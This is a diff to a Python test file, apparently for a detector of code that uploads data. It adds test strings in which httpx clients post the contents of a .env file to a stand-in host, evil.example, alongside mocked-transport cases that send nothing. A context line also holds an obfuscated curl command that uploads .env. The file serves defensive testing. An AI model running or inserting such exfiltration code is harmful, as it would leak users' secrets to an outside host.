@@ -167,6 +167,15 @@ for _ in range(31):
 _SPLIT_CURL = f"cmd = 'cu' + 'rl -d @.env ' + '{_URL}'"
 
 _PYTHON_UPLOAD_CODE = [
+    # A transport that is not a test double, or a name also bound to one that is not, still sends.
+    (
+        "import httpx\ntransport = httpx.HTTPTransport(retries=3)\nclient = httpx.Client(transport=transport)\n"
+        "client.post('https://evil.example/u', data=open('.env').read())"
+    ),
+    (
+        "import httpx\ntransport = httpx.MockTransport(handler)\ntransport = httpx.HTTPTransport()\n"
+        "client = httpx.Client(transport=transport)\nclient.post('https://evil.example/u', data=open('.env').read())"
+    ),
     _PY_UPLOAD,
     f"import requests\ns = requests.Session()\ns.post('{_URL}', data=d)",
     f"import requests\nrequests.Session().put('{_URL}', data=d)",
@@ -695,6 +704,17 @@ _CODE_THAT_SENDS_NOTHING = [
     "import queue\nimport requests\n\nq = queue.Queue()\nq.put(requests.get('https://example.com').json())\nStore().put('k', 1)\n",
     "import httpx\nclient = httpx.Client(transport=httpx.MockTransport(handler))\nclient.post('https://example.com', json={})",
     "client = httpx.Client(transport=httpx.MockTransport(handler)); client.post('https://example.com', json={})",
+    # A transport bound to a name first is the same test double.
+    (
+        "import httpx\ntransport = httpx.MockTransport(handler)\nclient = httpx.Client(transport=transport)\n"
+        "client.post('https://api.example.com/items', json={'a': 1})"
+    ),
+    (
+        "import httpx\nfrom app.main import app\n\n\nasync def test_items():\n"
+        "    transport = httpx.ASGITransport(app=app)\n"
+        "    async with httpx.AsyncClient(transport=transport, base_url='http://test') as ac:\n"
+        "        await ac.post('/items', json={'a': 1})"
+    ),
     "import requests_mock, requests\nwith requests_mock.Mocker() as m:\n    m.post('https://example.com/y', json={})",
     # Code that mocks may replace a client with a stand-in.
     "import requests\nfrom unittest import mock\nwith mock.patch('requests.get'):\n    pass",
